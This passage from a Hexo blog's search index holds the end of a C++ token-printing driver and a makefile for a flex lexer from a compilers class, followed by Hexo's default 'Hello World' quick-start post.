&lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_GT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_GT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_IF: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_IF &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_INTCONSTANT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_INTCONSTANT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_INTTYPE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_INTTYPE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_LEFTSHIFT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_LEFTSHIFT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_LEQ: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_LEQ &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_LSB: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_LSB &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_LT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_LT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_MINUS: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_MINUS &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_MOD: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_MOD &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_MULT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_MULT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_NEQ: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_NEQ &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_NOT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_NOT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_NULL: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_NULL &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_OR: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_OR &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_PLUS: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_PLUS &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_RIGHTSHIFT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_RIGHTSHIFT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_RSB: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_RSB &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_SEMICOLON: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_SEMICOLON &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_STRINGCONSTANT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_STRINGCONSTANT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_STRINGTYPE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_STRINGTYPE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_TRUE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_TRUE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_VAR: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_VAR &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_VOID: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_VOID &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_WHILE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_WHILE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_RETURN: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_RETURN &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>: <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">if</span> (token &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>makefile 文件</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><br>lexlib=l<br>bindir=.<br>rm=/bin/rm -f<br>targets=<br>cpptargets=decaflex<br><br><span class="hljs-section">all: <span class="hljs-variable">$(targets)</span> <span class="hljs-variable">$(cpptargets)</span></span><br><br><span class="hljs-variable">$(targets)</span>: %: %.lex<br>@echo <span class="hljs-string">&quot;compiling lex file:&quot;</span> <span class="hljs-variable">$&lt;</span><br>@echo <span class="hljs-string">&quot;output file:&quot;</span> <span class="hljs-variable">$@</span><br>flex -o<span class="hljs-variable">$@</span>.c <span class="hljs-variable">$&lt;</span><br>gcc -o <span class="hljs-variable">$(bindir)</span>/<span class="hljs-variable">$@</span> <span class="hljs-variable">$@</span>.c -l<span class="hljs-variable">$(lexlib)</span><br><span class="hljs-variable">$(rm)</span> <span class="hljs-variable">$@</span>.c<br><br><span class="hljs-variable">$(cpptargets)</span>: %: %.lex<br>@echo <span class="hljs-string">&quot;compiling cpp lex file:&quot;</span> <span class="hljs-variable">$&lt;</span><br>@echo <span class="hljs-string">&quot;output file:&quot;</span> <span class="hljs-variable">$@</span><br>flex -o<span class="hljs-variable">$@</span>.cc <span class="hljs-variable">$&lt;</span><br>g++ -o <span class="hljs-variable">$(bindir)</span>/<span class="hljs-variable">$@</span> <span class="hljs-variable">$@</span>.cc -l<span class="hljs-variable">$(lexlib)</span><br><span class="hljs-variable">$(rm)</span> <span class="hljs-variable">$@</span>.cc<br><br><span class="hljs-section">clean:</span><br><span class="hljs-variable">$(rm)</span> <span class="hljs-variable">$(targets)</span> <span class="hljs-variable">$(cpptargets)</span><br><br></code></pre></td></tr></table></figure><p>lex 默认从 stdin 获取输入流。<br>我的实现  <a href="https://github.com/P4nda0s/compilers-class-hw">https://github.com/P4nda0s/compilers-class-hw</a></p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/12/30/hello-world/"/>
    <url>/2020/12/30/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
